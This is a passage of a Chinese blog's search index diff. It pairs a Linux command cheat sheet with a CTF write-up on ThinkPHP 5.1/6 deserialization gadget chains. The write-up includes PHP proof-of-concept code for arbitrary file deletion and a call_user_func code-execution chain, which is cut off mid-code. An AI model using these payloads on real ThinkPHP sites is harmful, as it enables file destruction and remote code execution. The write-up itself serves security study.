+<h6 id="7-cp命令（拷贝目录）"><a href="#7-cp命令（拷贝目录）" class="headerlink" title="7.cp命令（拷贝目录）"></a>7.cp命令（拷贝目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪切复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
+
+<h6 id="8-cat命令"><a href="#8-cat命令" class="headerlink" title="8.cat命令"></a>8.cat命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 文件名                    //查看文件中的全部信息(适合查看小文档)</span><br></pre></td></tr></table></figure>
+
+<h6 id="9-rmp命令（插件安装命令）"><a href="#9-rmp命令（插件安装命令）" class="headerlink" title="9.rmp命令（插件安装命令）"></a>9.rmp命令（插件安装命令）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：插件安装命令</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -e httpd                                 //卸载/删除apache</span><br></pre></td></tr></table></figure>
+
+<h6 id="10-修改ip命令"><a href="#10-修改ip命令" class="headerlink" title="10.修改ip命令"></a>10.修改ip命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">主要修改以下配置：  </span><br><span class="line">TYPE=Ethernet               //网络类型</span><br><span class="line">BOOTPROTO=static            //静态IP</span><br><span class="line">DEVICE=ens00                //网卡名</span><br><span class="line">IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">GATEWAY=192.168.1.1         //网关</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //备用DNS</span><br><span class="line">ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">-------------------------------------------------</span><br><span class="line">修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure>
+
+<h6 id="11-apt命令（一般跟随sudo进行）"><a href="#11-apt命令（一般跟随sudo进行）" class="headerlink" title="11.apt命令（一般跟随sudo进行）"></a>11.apt命令（一般跟随sudo进行）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个新软件包，软件临时存放到/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个软件包</span><br><span class="line">apt-get remove packagename #卸载一个已安装的软件包（保留配置文档）</span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br></pre></td></tr></table></figure>
+
+<h6 id="12-sudo命令"><a href="#12-sudo命令" class="headerlink" title="12.sudo命令"></a>12.sudo命令</h6><p><code>sudo</code>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的<code>root</code>命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非<code>root</code>的用户运行只有<code>root</code>才有权限执行的命令。</p>
+<h6 id="13-dpkg命令（使用时需要有deb软件包）"><a href="#13-dpkg命令（使用时需要有deb软件包）" class="headerlink" title="13.dpkg命令（使用时需要有deb软件包）"></a>13.dpkg命令（使用时需要有deb软件包）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  为对应的下载xx.deb软件的命令</span><br><span class="line">sudo dpkg -r xx.deb  为对应的卸载xx.deb软件的命令</span><br><span class="line">sudo dpkg -c xx.deb  显示软件包内文件列表</span><br><span class="line">sudo dpkg -l xx.deb  查询软件包的版本</span><br></pre></td></tr></table></figure>
+
+<p>使用这个命令需要有deb软件包</p>
+<p>步骤为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先cd xx.deb</span><br><span class="line">最后下载sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>
+
+<h6 id="14-yum命令（ubuntu需配置yum安装源才可使用）"><a href="#14-yum命令（ubuntu需配置yum安装源才可使用）" class="headerlink" title="14.yum命令（ubuntu需配置yum安装源才可使用）"></a>14.yum命令（ubuntu需配置yum安装源才可使用）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum update #全部更新</span><br></pre></td></tr></table></figure>
+
+<h6 id="15-在ubuntu上配置git"><a href="#15-在ubuntu上配置git" class="headerlink" title="15.在ubuntu上配置git"></a>15.在ubuntu上配置git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用sudo apt-get install git进行安装</span><br><span class="line">git --version查看版本</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;   该命令获取公钥，一般会存在于/root/.ssh文件中</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     使用该命令查看公钥</span><br><span class="line">复制公钥进行github的上传</span><br><span class="line">git config --list   可查看配置信息</span><br></pre></td></tr></table></figure>
+
+<h6 id="16-ubuntu换源"><a href="#16-ubuntu换源" class="headerlink" title="16.ubuntu换源"></a>16.ubuntu换源</h6><p>先备份镜像源设置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
+
+<p>再编辑镜像源设置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<p>最后复制下面的所有内容替换掉原文件中的所有内容（阿里源）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
+<h6 id="17-root模式"><a href="#17-root模式" class="headerlink" title="17.root模式"></a>17.root模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入为su root</span><br><span class="line">退出为快捷键ctrl+d或者输入exit</span><br></pre></td></tr></table></figure>
+
+<h6 id="18-pwd命令（查看目录的绝对路径）"><a href="#18-pwd命令（查看目录的绝对路径）" class="headerlink" title="18.pwd命令（查看目录的绝对路径）"></a>18.pwd命令（查看目录的绝对路径）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>
+
+<h6 id="19-关机命令"><a href="#19-关机命令" class="headerlink" title="19.关机命令"></a>19.关机命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">shutdown -r now 重启系统</span><br><span class="line">reboot    重启系统</span><br></pre></td></tr></table></figure>
+
+<h6 id="20-chmod命令（权限管理）"><a href="#20-chmod命令（权限管理）" class="headerlink" title="20.chmod命令（权限管理）"></a>20.chmod命令（权限管理）</h6><p>每个文件都有三个权限分别是r–读，w–写，x–执行，分别对应数字是4，2，1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 name即赋予了name文件所有人的全部权限，文件所有组拥有读和写的权限，而其他人只拥有读的权限。</span><br></pre></td></tr></table></figure>
+
+<p>777的第一个7代表user即文件所有人，第二个6代表gourp即文件所有组，第三个4代表other即其他人</p>
+<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdb是一种程序调试工具</p>
+<h6 id="22-find命令（可寻找文件）"><a href="#22-find命令（可寻找文件）" class="headerlink" title="22.find命令（可寻找文件）"></a>22.find命令（可寻找文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    为寻找/home里的.txt文件</span><br><span class="line">find -name &quot;*.txt&quot;    为寻找该目录下的.txt文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="23-ps命令"><a href="#23-ps命令" class="headerlink" title="23.ps命令"></a>23.ps命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure>
+
+<h6 id="24-help命令"><a href="#24-help命令" class="headerlink" title="24.help命令"></a>24.help命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令 --help</span><br></pre></td></tr></table></figure>
+
+<h6 id="25-mount命令（挂载）"><a href="#25-mount命令（挂载）" class="headerlink" title="25.mount命令（挂载）"></a>25.mount命令（挂载）</h6><p>linux只能访问根目录里面的东西，如果想要访问根目录以外的东西就需要先”挂载“。</p>
+<h6 id="26-tail命令和head命令"><a href="#26-tail命令和head命令" class="headerlink" title="26.tail命令和head命令"></a>26.tail命令和head命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #查看后5行内容</span><br><span class="line">head -5     #查看前5行内容</span><br></pre></td></tr></table></figure>
+
+<h6 id="27-chown命令（改变文件的属主）"><a href="#27-chown命令（改变文件的属主）" class="headerlink" title="27.chown命令（改变文件的属主）"></a>27.chown命令（改变文件的属主）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid 的所有者设置 root</span><br><span class="line">chown runoob:runoobgroup file1.txt    将文件 file1.txt 的拥有者设为 runoob，群体的使用者 runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       将当前前目录下的所有文件与子目录的拥有者皆设为 runoob，群体的使用者 runoobgroup</span><br></pre></td></tr></table></figure>
+
+<h6 id="28-kill命令（结束进程）"><a href="#28-kill命令（结束进程）" class="headerlink" title="28.kill命令（结束进程）"></a>28.kill命令（结束进程）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程</span><br></pre></td></tr></table></figure>
+
+<h6 id="29-grep命令"><a href="#29-grep命令" class="headerlink" title="29.grep命令"></a>29.grep命令</h6><p>用于查找文件里符合条件的字符串</p>
+<h6 id="30-tar命令"><a href="#30-tar命令" class="headerlink" title="30.tar命令"></a>30.tar命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     将test文件夹打包为test.tar并不压缩</span><br><span class="line">tar -zcvf test.tar.gz test     将test文件打包后以gzip压缩，默认以tar.gz为结尾名称为test.tar.gz</span><br></pre></td></tr></table></figure>
+
+<h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
   </entry>
   <entry>
     <title>2023 nkctf的web部分解题</title>
@@ -1009,6 +1087,142 @@
 ]]></content>
   </entry>
   <entry>
+    <title>buuctf的部分解题</title>
+    <url>/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>tp反序列化漏洞</p>
+<span id="more"></span>
+
+<h3 id="tp6"><a href="#tp6" class="headerlink" title="tp6"></a>tp6</h3><p>链子：__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()</p>
+<p>$this-&gt;exists &#x3D; true;<br>$this-&gt;$lazySave &#x3D; true;<br>$this-&gt;$withEvent &#x3D; false;</p>
+<p>__destruct()到save()</p>
+<p>让lazySave为真</p>
+<p>save()到updateData()</p>
+<p>需要先进入到isEmpty()让data不为空，再进入trigger()让withEvent为false</p>
+<p>updateData()到getChangedData()</p>
+<p>让force为true</p>
+<p>$data 为非空</p>
+<p>getChangedData()继续到checkAllowFields()</p>
+<p>$field和$schema 为空</p>
+<p>db()到__toString()</p>
+<p>__toString()到toJson()到toArray()</p>
+<p>toArray()到getAttr()</p>
+<p>$key的值传到getData()</p>
+<p>getAttr()到getData()</p>
+<p>传入的值不为空</p>
+<p>getData()到getRealFieldName()</p>
+<p>当$this-&gt;strict为true时直接返回$name，即$key</p>
+<p>回到getData()，此时$fieldName &#x3D; $key</p>
+<p>返回$this-&gt;data[$fielName]也就是$this-&gt;data[$key]，记为$value</p>
+<p>从getData()再回到getAttr()再到getValue()</p>
+<h3 id="tp6-0"><a href="#tp6-0" class="headerlink" title="tp6.0"></a>tp6.0</h3><p>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php，看save()函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153429066.png" alt="image-20230303153429066"></p>
+<p>跟进write()函数</p>
+<p>在vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php中</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153728183.png" alt="image-20230303153728183"></p>
+<p>调用了<strong>writeFile</strong>函数，继续跟进</p>
+<p>在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong>中</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153827729.png" alt="image-20230303153827729"></p>
+<p>看到<strong>file_put_contents</strong>函数，能写入文件</p>
+<p>由此倒推</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents($path,$content,LOCK_EX)中的参数$path,$content来源于writeFile($path,$data)</span><br><span class="line"></span><br><span class="line">writeFile($path,$data)中的参数$path,$data来源于write(String $sessID,String $sessData)</span><br><span class="line"></span><br><span class="line">write(String $sessID,String $sessData)中的参数$sessID,$sessData来源于save()中调用了write()</span><br></pre></td></tr></table></figure>
+
+<p>在save函数中有**getId()**函数，跟进，还有一个setId函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303154636521.png" alt="image-20230303154636521"></p>
+<p>结合发现，当传入的id值长度为32时，创建sessionId，然后进行gitId()</p>
+<p>寻找调用<strong>setID</strong>的地方，在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303191949198.png" alt="image-20230303191949198"></p>
+<p>这还需要利用到getName函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/232af69eba7c4ac497f476c9bbd72041.png" alt="img"></p>
+<p>发现控制的是session中的名为PHPSESSID的值，可以利用这个来上传文件</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>[GYCTF2020]EasyThinking</p>
+<h3 id="tp5-1-35"><a href="#tp5-1-35" class="headerlink" title="tp5.1.35"></a>tp5.1.35</h3><p>创建漏洞点</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165911024.png" alt="image-20230305165911024"></p>
+<p>起点为<code>/thinkphp/library/think/process/pipes/Windows.php</code>的<code>__destruct()</code></p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145613227.png" alt="image-20230302145613227"></p>
+<p>这里调用了两个函数，先看removeFiles()函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145652860.png" alt="image-20230302145652860"></p>
+<p>$files是可控的，可以删除任意路径的文件</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="string">&#x27;需要删除文件的路径&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>在removeFiles()函数中，file_exist函数会将$filename当作字符串返回</p>
+<p><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用时会被触发</p>
+<p>跟进<code>\thinkphp\library\think\model\concern\Conversion.php</code>，找到<code>__toString</code> 方法</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154027060.png" alt="image-20230302154027060"></p>
+<p><code>__toString</code> 方法中还有一个toJson方法，查看toJson方法</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154131074.png" alt="image-20230302154131074"></p>
+<p>继续查看toArray方法，其中重要的部分是</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154530056.png" alt="image-20230302154530056"></p>
+<p>这里调用了一个<code>getRelation</code>方法，找到<code>\thinkphp\library\think\model\concern\Attribute.php</code>，继续查看<code>getRelation</code>方法</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302160945021.png" alt="image-20230302160945021"></p>
+<p>看toArray方法的重要部分，<code>getRelation</code>方法下有一个<code>if (!$relation)</code>，所以不用管<code>getRelation</code>方法，直接返回空就可以，然后调用了<code>getAttr</code>方法</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162010393.png" alt="image-20230302162010393"></p>
+<p>里面有一个getData方法</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162123772.png" alt="image-20230302162123772"></p>
+<p>通过<code>getData</code>函数可以知道<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>，而且这里的类定义使用的是Trait而不是class，因为用到了三个类，需要找一个类其中继承了<code>Attribute</code>类和<code>Conversion</code>类</p>
+<p>在<code>\thinkphp\library\think\Model.php</code>中找到这样一个类</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302164807099.png" alt="image-20230302164807099"></p>
+<p>在缺少一个进行代码执行的点，寻找<code>__call方法</code>，<code>__call</code>一般会存在<code>__call_user_func</code>和<code>__call_user_func_array</code>，php代码执行的终点经常选择这里</p>
+<p>在<code>/thinkphp/library/think/Request.php</code>，找到一个<code>__call</code>函数，<code>__call</code> 调用不可访问或不存在的方法时被调用</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302170634963.png" alt="image-20230302170634963"></p>
+<p>但是因为某些原因，这个方法并不能使用</p>
+<p>但是在Thinkphp的Request类中还有一个功能filter功能，可以尝试覆盖<code>filter</code>的方法去执行代码</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302173603880.png" alt="image-20230302173603880"></p>
+<p>但是这里的$value不可控，需要找到可以控制$value的点，找到input函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205209904.png" alt="image-20230302205209904"></p>
+<p>但是input函数中的参数不可控，还得继续找到可控点，所以找到了param函数，重要部分</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302175226720.png" alt="image-20230302175226720"></p>
+<p>但是还是不可控，继续找可以调用param函数的地方，找到了isAjax函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302174824834.png" alt="image-20230302174824834"></p>
+<p>在<code>isAjax</code>函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，也就意味着param函数中的$name可控，param函数中的$name可控也就意味着input函数中的$name可控</p>
+<p>input函数中有</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205324936.png" alt="image-20230302205324936"></p>
+<p>可以控制的是name参数，查看getData函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205401346.png" alt="image-20230302205401346"></p>
+<p>这样$data就可控，就想当于可以控制$data，再跟进getFilter函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205554731.png" alt="image-20230302205554731"></p>
+<p>input函数中有</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210600148.png" alt="image-20230302210600148"></p>
+<p>因为getFilter会直接返回$filter，所以$filter就等于$this-&gt;filter，需要定义<code>$this-&gt;filter</code>为函数名</p>
+<p>这样call_user_func函数的回调函数可控，只剩下回调函数的参数</p>
+<p>再看input函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210753895.png" alt="image-20230302210753895"></p>
+<p>这里可以进行回调，跟进filterValue函数</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210851115.png" alt="image-20230302210851115"></p>
+<p>分析发现，在input函数中</p>
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305114544744.png" alt="image-20230305114544744"></p>
+<p>如果<code>$data</code>不可控，如果<code>$data</code>可控，而且<code>$name</code>为空字符串的话，input函数中前面的那些代码if条件就不成立，不构成影响，<code>$data</code>也就是回调函数的参数</p>
+<p>最终，$data和$filter都可控，<code>$value = call_user_func($filter, $value);</code>这样这个就可以使用</p>
+<p>最终poc</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 